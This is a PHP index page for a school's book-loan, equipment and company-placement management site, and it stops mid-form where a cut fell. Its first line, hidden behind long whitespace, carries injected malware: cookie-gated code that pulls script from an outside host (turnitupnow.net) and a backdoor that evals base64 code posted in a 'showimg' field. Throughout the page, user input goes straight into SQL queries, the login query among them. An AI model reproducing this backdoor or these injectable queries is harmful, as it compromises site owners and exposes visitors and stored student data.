<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
	//include_once("./system/auth.php");
		include_once("bdd.php");
		error_reporting(E_ALL);
		ini_set('display_errors', '0');
		include_once("./system/borrar.php");
		session_start(); 	?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>FCT - IES Cotes Baixes</title>
<link href="resources/estilos.css" rel="stylesheet" type="text/css" />
</head>
<script language="JavaScript">
function Abrir_ventana (pagina) {
var opciones="toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, width=520, height=400, top=50, left=100";
window.open(pagina,"",opciones);
}
</script>
<script language="javascript"> function confirmar ( mensaje ) { return confirm( mensaje ); } </script>

<?php 
	if (isset($_GET['off'])) {
	
	session_destroy();
	
	}

	if (isset($_GET['obs'])) { 
	
		$idobs = $_GET['obs'];
		$obs = $_POST['obs'];
		
		$result = $db->Execute("UPDATE CDL_completa SET notas = '$obs' WHERE id = $idobs");
	
	}
	 if (isset($_GET['desc'])) { 
	
		$iddesc = $_GET['desc'];
		$desc = $_POST['desc'];
		
		$result = $db->Execute("UPDATE CDM_caract SET des = '$desc' WHERE id = $iddesc");
		//if ($result === false) die("failed");
	
	}
?>

<body>
<p>index.php</p>
<?php if (isset($_GET['login'])) {

	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	
	$result = $db->Execute("SELECT * FROM usuarios WHERE nombre = '$nombre' AND pass = '$pass'");
	if ($result === false) die("failed"); 
		
		while (!$result->EOF) {
			for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
				$lvl = $result->fields[3];
			$result->MoveNext();
		}
		if ($max >= 1) { 
		
			session_start(); 
			$_SESSION["autentificado"]=$lvl;
			$SMS = "Te has identificado correctamente, bienvenido ".$nombre;
		
		} else { $SMS = "Lo sentimos, los datos facilitados no son correctos ".$nombre; }
} ?>
<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td width="295">&nbsp;</td>
    <td width="7" background="resources/linea.PNG">&nbsp;</td>
    <td width="478" class="texte_normal"><?php echo $SMS ?></td>
    <td width="200" align="right" class="texte_normal"><?php if (isset($_SESSION["autentificado"])) { ?>
      <a href="index.php?off" class="texte_normal">Cerrar Sesión</a>&nbsp;&nbsp; 
          <?php } ?></td>
  </tr>
</table>
<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="295"><img src="resources/practiques.jpg" width="295" height="70" /></td>
        <td width="7" background="resources/linea.PNG">&nbsp;</td>
        <td width="678"><table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td height="14"></td>
            <td></td>
            <td></td>
            <td></td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td width="32"><img src="resources/con_libros.png" width="32" height="32" /></td>
            <td width="181" class="texte_normal">&nbsp;&nbsp;<a href="index.php?menu=1" class="texte_normal">Consultar Libros</a></td>
            <td width="32"><img src="resources/con_material.png" width="32" height="32" /></td>
            <td width="181" class="texte_normal">&nbsp;&nbsp;<a href="index.php?menu=2" class="texte_normal">Consultar Material</a></td>
            <td width="32"><img src="resources/con_empresas.png" width="32" height="32" /></td>
            <td class="texte_normal">&nbsp;&nbsp;<a href="index.php?menu=3&amp;sub=1" class="texte_normal">Consultar Empresas</a></td>
          </tr>
        </table></td>
  </tr>
</table>
	
    <?php 
		  $menu=$_GET['menu'];
		  
		   switch ($menu) { 
		   
			 case 1: if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else { ?>
             
				<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="295" valign="top">
                <?php if (isset($_GET['edit']) && (($_SESSION["autentificado"] == 1) || ($_SESSION["autentificado"] == 3))) { include ("edit.php"); } ?>
				<?php if ($_SESSION["autentificado"] == 1) { include ("lat_admin_1.php"); } ?>
                <?php if ($_SESSION["autentificado"] == 3) { include ("lat_cap_1.php"); } ?>
                <?php if ($_SESSION["autentificado"] == 10) { include ("excel_libros.php"); } ?>
                <?php if ($_SESSION["autentificado"] == 10) { include ("excel_alumnos.php"); } ?>
                <?php if ($_SESSION["autentificado"] == 10) { include ("excel_empresas.php"); } ?>
                </td>
				<td width="7" background="resources/linea.PNG">&nbsp;</td>
				<td width="678" valign="top">
                
                <table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="120" height="24" align="center" bgcolor="#000000" class="texte_normal_blanco">&nbsp;<a href="index.php?menu=1&amp;sub=1" class="texte_normal_blanco">Consultar Libros</a></td>
				<td width="120" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=1&amp;sub=2&amp;nombre" class="texte_normal_blanco">Prestar un Libro</a></td>
				<td width="125" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=1&amp;sub=3" class="texte_normal_blanco">Libros Prestados</a></td>
				<td align="center" bgcolor="#000000" class="texte_normal_blanco">&nbsp;</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
			<?php $sub = $_GET['sub'];
					switch ($sub) { 
		   				case 1:
				?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco">
				  <form id="form1" name="form1" method="post" action="index.php?menu=1&search" style="margin:0px">
				    <table width="670" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                        <td width="160" align="center"><label>
                          <select name="campo" class="texte_normal" id="campo">
                            <option value="nombre">Nombre</option>
                            <option value="publicacion">Publicacion</option>
                            <option value="autor">Autor</option>
                            <option value="editorial">Editorial</option>
                            <option value="ubicacion">Ubicacion</option>
                            <option value="campo">Campo</option>
                            <option value="ubicacion">Ubicacion</option>
                            <option value="isbn">ISBN</option>
                        </select>
                        </label></td>
                  <td width="280" align="center"><label>
                          <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                      </label></td>
                        <td width="115" align="center"><label>
                        <input type="image" src="resources/bt_buscar.png" name="button" id="button" value="Enviar" />
                        </label></td>
                      </tr>
                    </table>
                  </form>
				  </td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="670" border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td width="141" align="center" class="texte_mini_b">ISBN</td>
                        <td width="346" align="center" class="texte_mini_b">Nombre</td>
                        <td width="110" align="center" class="texte_mini_b">Año. Pub</td>
                        <td width="10" align="center" class="texte_mini_b">&nbsp;</td>
                        <td width="63">&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <div id="scroll">
				<?php 	
				
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					$result = $db->Execute("SELECT * FROM CDL_completa WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT * FROM CDL_completa ORDER BY id DESC");
							
				}
				
					if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$nombre = $result->fields[4];
					$isbn = $result->fields[14];
					$publicacion = $result->fields[20];
					
					$obs = $result->fields[34];
                
                ?>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellspacing="0" cellpadding="0">
				  <tr>
				    <td height="5" colspan="6" align="center" class="texte_mini"></td>
			      </tr>
				  <tr>
				    <td colspan="2" align="center" class="texte_mini"><?php echo utf8_encode($isbn) ?></td>
				    <td width="349" align="center" class="texte_mini"><?php echo utf8_encode($nombre) ?></td>
				    <td width="110" align="center" class="texte_mini"><?php echo utf8_encode($publicacion) ?></td>
				    <td width="25" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
				      <a href="index.php?menu=<?php echo $menu ?>&amp;edit=<?php echo $id ?>"><img alt="Editar" src="resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
				      <?php } ?></td>
				    <td width="25" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
				      <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDL_completa" onclick="return confirmar('Se borrara definitivamente')"><img src="resources/ico_m_del.png" alt="Borrar" width="16" height="16" border="0" /></a>
				      <?php } ?></td>
			      </tr>
				  <tr>
				    <?php // if ($_SESSION["autentificado"] == 5) { ?>
				    <td height="5" colspan="6" align="center" class="texte_mini"></td>
			      </tr>
				  <tr>
				    <td width="130" align="center" bgcolor="#FBFBFB" class="texte_mini">Observaciones</td>
				    <td colspan="3" align="left" bgcolor="#FBFBFB" class="texte_mini"><form id="form2" name="form2" method="post" action="index.php?menu=1&amp;obs=<?php echo $id ?>" style="margin:0px">
				      <label>
				        <input name="obs" type="text" class="texte_mini" id="obs" value="<?php echo utf8_encode($obs) ?>" size="70" />
			          </label>
				      <label> &nbsp;&nbsp;&nbsp;
				        <input name="button2" type="submit" class="texte_mini" id="button2" value="Guardar" />
			          </label>
				      </form></td>
				    <td colspan="2" align="center" bgcolor="#FBFBFB" class="texte_mini"><?php if ($_SESSION["autentificado"] == 10) { ?>
				      <a href="index.php?menu=1&amp;sub=2&amp;idl=<?php echo $id ?>&amp;nombre=<?php echo htmlentities($nombre) ?>">
				        <!--<img src="resources/prestar2.png" width="45" height="14" border="0" />-->
			          </a>
				      <?php } ?></td>
				    <?php // } ?>
			      </tr>
				  <tr>
				    <td height="5" colspan="6" align="center" class="texte_mini"></td>
			      </tr>
				  </table></td>
				</tr>
				</table>
				<?php
					$result->MoveNext();
					}?>
                  </div>
		  <?php
				break; 
		   		case 2:
				?>
                
                     <?php 	if (isset($_GET['guardar'])) {
				
							
							$libro = $_POST['libro'];
							$persona = $_POST['alumno'];
							$asignatura = $_POST['asignatura'];
							$prestamo = date('Y-m-d');
							$devolucio = date('Y-m-d',strtotime('+17 days'));
							
							$result = $db->Execute("INSERT INTO CDL_prestec(idl, persona, devolucio, prestamo) VALUES ('$libro','$persona','$devolucio','$prestamo')");
							if ($result === false) die("failed");
							
							echo $sms = '<span class="texte_mini"><center>El registro se completo correctamente, recuerde que puede realizar un seguimiento de los libros prestados desde el menu Libros Prestados o accediendo desde <a href="index.php?menu=1&amp;sub=3">este enlace</a>.</center></span>';
				
						}
				
						if (isset($_GET['nombre'])) {
				
						$idl = $_GET['idl'];
						$libro = $_GET['nombre'];
				 ?>
                <table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Crear un nuevo Prestamo de Libro</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
           		<?php if (isset($_GET['dispo'])) { 
					$libro = $_POST['libro'];
					$alumno =  $_POST['alumno'];
				?>
                  <form id="form8" name="form8" method="post" action="index.php?menu=1&sub=2&guardar" style="margin:0px">
				<?php 
					} else { ?>
                  <form id="form8" name="form8" method="post" action="index.php?menu=1&sub=2&nombre&dispo" style="margin:0px">
                <?php } ?>
                  <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="15%" height="20" class="texte_normal">Cod. Libro</td>
                      <td width="35%" class="texte_normal"><input name="libro" type="text" class="texte_normal" id="libro" value="<?php echo $libro ?>" /> <?php if (isset($_GET['dispo'])) { ?> 
                      <a href="javascript:Abrir_ventana('ficha_libro.php?id=<?php echo $libro ?>')" class="texte_normal">Ver</a>
                      <?php } ?> </td>
                      <td width="15%" class="texte_normal">Apellidos Alum</td>
                      <td width="35%"><input name="alumno" type="text" class="texte_normal" id="alumno" value="<?php echo $alumno ?>" /> <a href="javascript:Abrir_ventana('ficha_alumno.php?id=<?php echo $alumno ?>')" class="texte_normal">
                      <?php if (isset($_GET['dispo'])) { ?>
Ver
                        <?php } ?>
                      </a></td>
                    </tr>
                    <tr>
                      <td width="15%" height="20" class="texte_normal">Fecha Hoy</td>
                      <td width="35%" class="texte_normal"><?php echo date('d-m-Y'); ?></td>
                      <td width="15%" class="texte_normal">Fecha Tope</td>
                      <td width="35%" class="texte_normal"><?php echo $devolucion = date('d-m-Y',strtotime('+17 days')); ?></td>
                    </tr>
                    <tr>
                      <td height="30" colspan="4" align="center">
                             
				<?php if (isset($_GET['dispo'])) {
							
					  		$result = $db->Execute("SELECT * FROM CDL_prestec WHERE idl = '$libro'"); 
					  		if ($db->Affected_Rows() === 0) { ?>
                      			<input name="button8" type="submit" class="texte_mini" id="button8" value="Registrar prestamo de libro" />
                     		<?php } else { ?>
                     			 <span class="fallo">Lo sentimos, este libro no esta disponibles pues ya esta prestado.</span>
                      		<?php } ?>
					  <?php } else { ?>                      
                      <input name="button8" type="submit" class="texte_mini" id="button8" value="Comprobar Disponibilidad" />
                <?php } ?>
                      </td>
                    </tr>
                  </table>
                  </form>
                
				<?php } ?>
				
				<?php break; 
		   		case 3: ?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="670" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="165" align="center" class="texte_mini_b">Libro</td>
                          <td width="150" align="center" class="texte_mini_b">Alumno</td>
                          <td width="153" align="center" class="texte_mini_b">Fecha Prestamo</td>
                          <td width="145" align="center" class="texte_mini_b">Fecha Maxima  Devolución</td>
                          <td width="57">&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
             <div id="scroll">
                <?php $result = $db->Execute("SELECT * FROM CDL_prestec ORDER BY id DESC"); 
							if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
						$id = $result->fields[0];
						$persona = $result->fields[2];
						$libro = $result->fields[1];
						$devolucio = $result->fields[3];
						$prestec = $result->fields[4];
						
						$devolucio =  date("d/m/Y",strtotime($devolucio));
						$prestec =  date("d/m/Y",strtotime($prestec));
						//$devolucion =  date("d/m/Y",strtotime($fecha));
					
					?>
                
<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
               </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td height="5" colspan="5" align="center" class="texte_mini"></td>
                        </tr>
                        <tr>
                          <td width="150" align="center" class="texte_mini"><?php echo $libro ?></td>
                          <td width="150" align="center" class="texte_mini"><?php echo $persona ?></td>
                          <td width="150" align="center" class="texte_mini"><?php echo $prestec ?></td>
                          <td width="150" align="center" class="texte_mini"><?php echo $devolucio ?></td>
                          <td width="40" align="center">
                            <?php if ($_SESSION["autentificado"] == 10) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDL_prestec" onclick="return confirmar('Se borrara definitivamente')"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                              <?php } ?></td>
                        </tr>
                        <tr>
                          
                          <td height="5" colspan="5" align="center" class="texte_mini"></td>
                        </tr>
                        
                    </table>
                    
                    </td>
                  </tr>
                </table><?php $result->MoveNext();
					} ?>    
                <?php } ?>
                <?php break; }?>				
                
                
               
                </div></td>
				</tr>
				</table> <?php break; 
				
			 case 2:  if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else { ?>
             
				<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="295" valign="top">
                <?php if (isset($_GET['edit']) && (($_SESSION["autentificado"] == 1) || ($_SESSION["autentificado"] == 3))) { include ("edit.php"); } ?>
				<?php if ($_SESSION["autentificado"] == 1) { include ("lat_admin_2.php"); } ?>
                <?php if ($_SESSION["autentificado"] == 3) { include ("lat_cap_1.php"); } ?>
                </td>
				<td width="7" background="resources/linea.PNG">&nbsp;</td>
				<td width="678" valign="top"><table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Material</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form3" name="form1" method="post" action="index.php?menu=2&amp;search" style="margin:0px">
                  <table width="670" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                      <td width="160" align="center"><label>
                      <select name="campo" class="texte_normal" id="campo">
                        <option value="concepto">Concepto</option>
                        <option value="fabricante">Fabricante</option>
                          <option value="ubicacion">Ubicacion</option>
                        <option value="fecha">Fecha</option>
                        <option value="referencia">Referencia</option>
                        <option value="depatament">Departamento</option>
                      </select>
                      </label></td>
                      <td width="280" align="center"><label>
                      <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                      </label></td>
                      <td width="115" align="center"><label>
                      <input type="image" src="resources/bt_buscar.png" name="button3" id="button3" value="Enviar" />
                      </label></td>
                    </tr>
                  </table>
				  </form></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="670" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="106" align="center" class="texte_mini_b">Nombre</td>
                          <td width="97" align="center" class="texte_mini_b">Concepto</td>
                          <td width="80" align="center" class="texte_mini_b">Fabricante</td>
                          <td width="82" align="center" class="texte_mini_b">Referencia</td>
                          <td width="50" align="center" class="texte_mini_b">Cantidad</td>
                          <td width="90" align="center" class="texte_mini_b">Ubicación</td>
                          <td width="85" align="center" class="texte_mini_b">Departamento</td>
                          <td width="50">&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <div id="scroll">
				<?php 	
				
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					$result = $db->Execute("SELECT * FROM CDM_caract WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT * FROM CDM_caract ORDER BY id DESC");
							
				}
				
					if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$nombre = $result->fields[1];
					$concepto = $result->fields[2];
					$fabricante = $result->fields[3];
					$referencia = $result->fields[4];
					$cantidad = $result->fields[5];
					$desc = $result->fields[6];
					$ubicacion = $result->fields[7];
					$fecha = $result->fields[8];
					$departamet = $result->fields[9];
                
                ?>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td height="5" colspan="9" align="center" class="texte_mini"></td>
                        </tr>
                        <tr>
                          <td width="106" align="center" class="texte_mini"><?php echo utf8_encode($nombre) ?></td>
                          <td width="97" align="center" class="texte_mini"><?php echo utf8_encode($concepto) ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo utf8_encode($fabricante) ?></td>
                          <td width="82" align="center" class="texte_mini"><?php echo utf8_encode($referencia) ?></td>
                          <td width="50" align="center" class="texte_mini"><?php echo utf8_encode($cantidad) ?></td>
                          <td width="90" align="center" class="texte_mini"><?php echo utf8_encode($ubicacion) ?></td>
                          <td width="85" align="center" class="texte_mini"><?php echo utf8_encode($departamento) ?></td>
                    <td width="25" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>&amp;edit=<?php echo $id ?>"><img src="resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                          <?php } ?></td>
                    <td width="25" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>" onclick="return confirmar('Se borrara definitivamente')"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                            <?php } ?></td>
                      </tr>
                        <tr>
                          <?php if ($_SESSION["autentificado"] == 5) { ?>
                          <td height="5" colspan="9" align="center" class="texte_mini"></td>
                        </tr>
                        <tr>
                          <td align="center" bgcolor="#FBFBFB" class="texte_mini">Descripccion</td>
                          <td colspan="8" align="left" bgcolor="#FBFBFB" class="texte_mini"><form id="form4" name="form2" method="post" action="index.php?menu=2&amp;desc=<?php echo $id ?>" style="margin:0px">
                              <label>
                              <input name="desc" type="text" class="texte_mini" id="desc" value="<?php echo utf8_encode($desc) ?>" size="70" />
                              </label>
                              <label> &nbsp;&nbsp;&nbsp;
                                <input name="button4" type="submit" class="texte_mini" id="button4" value="Guardar" />
                              </label>
                          </form></td>
                          <?php } ?>
                        </tr>
                        <tr>
                          <td height="5" colspan="9" align="center" class="texte_mini"></td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
				<?php
					$result->MoveNext();
					}
                ?>
                </div></td>
				</tr>
				</table> <? } break; 
				
			 case 3:  if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else { ?>
             
				<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="295" valign="top">
                <?php if (isset($_GET['edit']) && (($_SESSION["autentificado"] == 1) || ($_SESSION["autentificado"] == 3))) { include ("edit.php"); } ?>
				<?php if ($_SESSION["autentificado"] == 1) { 
				
			
				include("n_empresa.php");
				
				
				/*
				if ($sub==1) { include ("n_empresa.php"); }
				if ($sub==2) { include ("n_alumno.php"); }
				if ($sub==3) { include ("n_ciclo.php"); }
				if ($sub==4) { include ("n_fct.php"); }
				if ($sub==5) { include ("n_demanda.php"); }
				*/
				
				 } ?>
                 
                 <?php if ($_SESSION["autentificado"] == 1) { 
				 
				 	include ("lat_familias.php");
				 
				 } ?>
                 
                </td>
				<td width="7" background="resources/linea.PNG">&nbsp;</td>
				<td width="678" valign="top"><table width="660" border="0" align="center" cellpadding="0" cellspacing="1">
                  <tr>
                    <td width="109" height="24" align="center" bgcolor="#000000" class="texte_normal_blanco">&nbsp;<a href="index.php?menu=3&amp;sub=1" class="texte_normal_blanco">Empresas </a></td>
                    <!--
                    <td width="109" align="center" bgcolor="#000000" class="texte_normal_blanco">Empresas II</td>
                    <td width="150" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=2" class="texte_normal_blanco">Consultar Alumnos</a></td>
                    <td width="140" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=3" class="texte_normal_blanco">Ciclos Formativos</a></td>
                    <td width="55" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=4" class="texte_normal_blanco">FCT</a></td>
                    <td width="90" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=5" class="texte_normal_blanco">Demandes</a></td>
                    -->
                  </tr>
                </table>
				  <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td height="6"></td>
                    </tr>
                  </table>
			
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="475" height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Empresas</td>
				<td width="185" align="center" bgcolor="#000000" class="texte_normal_blanco"><?php if ($_SESSION["autentificado"] == 1) { ?><b><a href="exportar_empresas.php" class="texte_normal_blanco">Búsqueda para Exportar</a></b><?php } ?></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form5" name="form5" method="post" action="index.php?menu=3&sub=<?php echo $sub ?>&search" style="margin:0px">
				  <table width="660" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                      <td width="160" align="center"><label>
                        <select name="campo" class="texte_normal" id="campo">
                          <option value="empresa" selected="selected">Nombre</option>
                          <!-- <option value="responsable">Gerente</option> -->
                          <option value="ciutat">Poblacion</option>
                          <option value="familia">Familia</option>
                          <option value="cif">CIF/NIF</option>
                      </select>
                      </label></td>
                      <td width="280" align="center"><label>
                        <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                      </label></td>
                      <td width="115" align="center"><label>
                      <input type="image" src="resources/bt_buscar.png" name="button5" id="button5" value="Enviar" />
                      </label></td>
                    </tr>
                  </table>
                                </form>				</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
                <!--
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco">
                    <form id="form9" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search2" style="margin:0px">
				      <table width="660" border="0" cellspacing="0" cellpadding="0">
				        <tr>
				          <td width="88" height="26" class="texte_normal">&nbsp;Buscar por</td>
				          <td width="97" align="center" class="texte_normal">Familia</td>
				          <td width="140" align="left"><select name="campo1" class="texte_normal" id="campo1">
				            <option value="CFGM-CM">CFGM-CM</option>
				            <option value="CGM - EIE">CGM - EIE</option>
				            <option value="CGM- MECA">CGM- MECA</option>
				            <option value="CGM-CM">CGM-CM</option>
				            <option value="CGM-EI">CGM-EI</option>
				            <option value="CGM-EIE">CGM-EIE</option>
				            <option value="CGS-SRCA">CGS-SRCA</option>
				            <option value="CGM-ET">CGM-ET</option>
				            <option value="CGM-EV">CGM-EV</option>
				            <option value="CGM-FMM">CGM-FMM</option>
				            <option value="CGM-GCM">CGM-GCM</option>
				            <option value="CGM-MECA">CGM-MECA</option>
				            <option value="CGM-OET">CGM-OET</option>
				            <option value="CGM-SRCA">CGM-SRCA</option>
				            <option value="CGS- CI">CGS- CI</option>
				            <option value="CGS- SRCA">CGS- SRCA</option>
				            <option value="CGS-AUT">CGS-AUT</option>
				            <option value="CGS-CGM">CGS-CGM</option>
				            <option value="CGS-CI">CGS-CI</option>
				            <option value="CGS-DPM">CGS-DPM</option>
				            <option value="CGS-GCM">CGS-GCM</option>
				            <option value="CGS-PTHT">CGS-PTHT</option>
				            <option value="CGS-RL">CGS-RL</option>
				            <option value="CGS-SRCA">CGS-SRCA</option>
				            <option value="CM">CM</option>
				            <option value="FAM. GCM">FAM. GCM</option>
				            <option value="GCS-CI">GCS-CI</option>
				            <option value="PCP-OAFM">PCP-OAFM</option>
				            <option value="PCP-OAPT">PCP-OAPT</option>
				            <option value="PTHT">PTHT</option>
                          </select></td>
				          <td width="94" align="center" class="texte_normal">Evaluación</td>
				          <td width="121" align="left"><label>
				            <select name="campo2" id="campo2">
				              <option value="A">A</option>
